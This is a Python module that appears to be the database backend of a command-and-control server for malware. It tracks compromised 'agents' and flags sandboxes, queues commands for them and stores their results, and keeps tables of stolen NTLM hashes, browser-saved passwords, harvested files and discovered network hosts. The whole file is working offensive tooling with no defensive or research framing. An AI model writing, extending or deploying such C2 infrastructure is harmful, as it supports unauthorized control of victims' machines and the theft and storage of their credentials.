import sqlite3
import os
import time
import uuid

DB_PATH = os.path.join(os.path.dirname(__file__), "c2.db")

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn

def init_db():
    conn = get_db()
    # Create tables if they don't exist
    conn.execute("""
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            ip_addr TEXT,
            username TEXT,
            os TEXT,
            last_checkin INTEGER,
            status TEXT DEFAULT 'active',
            is_sandbox INTEGER DEFAULT 0
        )
    """)
    
    # Migration: Add is_sandbox if missing (for older databases)
    cursor = conn.execute("PRAGMA table_info(agents)")
    columns = [row[1] for row in cursor.fetchall()]
    if "is_sandbox" not in columns:
        print("[*] Migrating database: Adding 'is_sandbox' column to 'agents' table.")
        conn.execute("ALTER TABLE agents ADD COLUMN is_sandbox INTEGER DEFAULT 0")

    conn.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            id TEXT PRIMARY KEY,
            agent_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            created_at INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS results (
            id TEXT PRIMARY KEY,
            task_id TEXT,
            agent_id TEXT,
            output TEXT,
            completed_at INTEGER,
            FOREIGN KEY(task_id) REFERENCES tasks(id),
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS hashes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            username TEXT,
            rid TEXT,
            ntlm_hash TEXT,
            created_at INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS discovered_hosts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            ip_addr TEXT,
            hostname TEXT,
            mac_addr TEXT,
            created_at INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS browser_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            url TEXT,
            username TEXT,
            password TEXT,
            browser TEXT,
            created_at INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.execute("""
        CREATE TABLE IF NOT EXISTS harvested_files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            filename TEXT,
            path TEXT,
            size INTEGER,
            category TEXT,
            created_at INTEGER,
            FOREIGN KEY(agent_id) REFERENCES agents(id)
        )
    """)
    conn.commit()
    conn.close()

# --- Agent Methods ---

def register_agent(agent_data):
    agent_id = agent_data.get("id") or str(uuid.uuid4())[:8]
    conn = get_db()
    try:
        conn.execute("""
            INSERT OR REPLACE INTO agents (id, hostname, ip_addr, username, os, last_checkin, is_sandbox)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (agent_id, agent_data.get("hostname"), agent_data.get("ip"), 
                agent_data.get("username"), agent_data.get("os"), int(time.time()),
                1 if agent_data.get("is_sandbox") else 0))
        conn.commit()
    finally:
        conn.close()
    return agent_id

def add_host(agent_id, ip_addr, hostname=None, mac_addr=None):
    conn = get_db()
    try:
        conn.execute("""
            INSERT OR REPLACE INTO discovered_hosts (agent_id, ip_addr, hostname, mac_addr, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (agent_id, ip_addr, hostname, mac_addr, int(time.time())))
        conn.commit()
    finally:
        conn.close()

def get_hosts(agent_id=None):
    conn = get_db()
    try:
        if agent_id:
            return [dict(row) for row in conn.execute("SELECT * FROM discovered_hosts WHERE agent_id = ?", (agent_id,)).fetchall()]
        return [dict(row) for row in conn.execute("SELECT * FROM discovered_hosts").fetchall()]
    finally:
        conn.close()

def update_checkin(agent_id):
    conn = get_db()
    try:
        conn.execute("UPDATE agents SET last_checkin = ? WHERE id = ?", (int(time.time()), agent_id))
        conn.commit()
    finally:
        conn.close()

def get_agents():
    conn = get_db()
    try:
        agents = [dict(row) for row in conn.execute("SELECT * FROM agents").fetchall()]
        return agents
    finally:
        conn.close()

def delete_agent(agent_id):
    conn = get_db()
    try:
        conn.execute("DELETE FROM results WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM tasks WHERE agent_id = ?", (agent_id,))
        conn.execute("DELETE FROM agents WHERE id = ?", (agent_id,))
        conn.commit()
    finally:
        conn.close()

# --- Task Methods ---

def add_task(agent_id, command):
    task_id = str(uuid.uuid4())[:8]
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO tasks (id, agent_id, command, created_at)
            VALUES (?, ?, ?, ?)
        """, (task_id, agent_id, command, int(time.time())))
        conn.commit()
    finally:
        conn.close()
    return task_id

def get_pending_tasks(agent_id):
    conn = get_db()
    try:
        rows = conn.execute("SELECT * FROM tasks WHERE agent_id = ? AND status = 'pending'", (agent_id,)).fetchall()
        tasks = [dict(row) for row in rows]
        for task in tasks:
            conn.execute("UPDATE tasks SET status = 'delivered' WHERE id = ?", (task["id"],))
        conn.commit()
        return tasks
    finally:
        conn.close()

# --- Result Methods ---

def add_result(task_id, agent_id, output):
    res_id = str(uuid.uuid4())[:8]
    conn = get_db()
    try:
        # Check if task_id exists or is a special label
        is_task = False
        if task_id:
            row = conn.execute("SELECT 1 FROM tasks WHERE id = ?", (task_id,)).fetchone()
            if row: is_task = True
            
        final_task_id = task_id if is_task else None
        
        conn.execute("""
            INSERT INTO results (id, task_id, agent_id, output, completed_at)
            VALUES (?, ?, ?, ?, ?)
        """, (res_id, final_task_id, agent_id, output, int(time.time())))
        
        if is_task:
            conn.execute("UPDATE tasks SET status = 'completed' WHERE id = ?", (task_id,))
        conn.commit()
    finally:
        conn.close()
    return res_id

def get_results(agent_id=None):
    query = "SELECT * FROM results"
    params = ()
    if agent_id:
        query += " WHERE agent_id = ?"
        params = (agent_id,)
    conn = get_db()
    try:
        results = [dict(row) for row in conn.execute(query, params).fetchall()]
        return results
    finally:
        conn.close()

def add_browser_cred(agent_id, url, username, password, browser):
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO browser_creds (agent_id, url, username, password, browser, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (agent_id, url, username, password, browser, int(time.time())))
        conn.commit()
    finally:
        conn.close()

def get_browser_creds(agent_id=None):
    conn = get_db()
    try:
        if agent_id:
            return [dict(row) for row in conn.execute("SELECT * FROM browser_creds WHERE agent_id = ?", (agent_id,)).fetchall()]
        return [dict(row) for row in conn.execute("SELECT * FROM browser_creds").fetchall()]
    finally:
        conn.close()

def add_harvested_file(agent_id, filename, path, size, category):
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO harvested_files (agent_id, filename, path, size, category, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (agent_id, filename, path, size, category, int(time.time())))
        conn.commit()
    finally:
        conn.close()

def get_harvested_files(agent_id=None):
    conn = get_db()
    try:
        if agent_id:
            return [dict(row) for row in conn.execute("SELECT * FROM harvested_files WHERE agent_id = ?", (agent_id,)).fetchall()]
        return [dict(row) for row in conn.execute("SELECT * FROM harvested_files").fetchall()]
    finally:
        conn.close()

if __name__ == "__main__":
    init_db()
    print("Database initialized.")
def add_hash(agent_id, username, rid, ntlm_hash):
    conn = get_db()
    try:
        conn.execute("""
            INSERT INTO hashes (agent_id, username, rid, ntlm_hash, created_at)
            VALUES (?, ?, ?, ?, ?)
        """, (agent_id, username, rid, ntlm_hash, int(time.time())))
        conn.commit()
    finally:
        conn.close()

def get_hashes(agent_id=None):
    conn = get_db()
    try:
        if agent_id:
            return [dict(row) for row in conn.execute("SELECT * FROM hashes WHERE agent_id = ? ORDER BY created_at DESC", (agent_id,)).fetchall()]
        return [dict(row) for row in conn.execute("SELECT * FROM hashes ORDER BY created_at DESC").fetchall()]
    finally:
        conn.close()
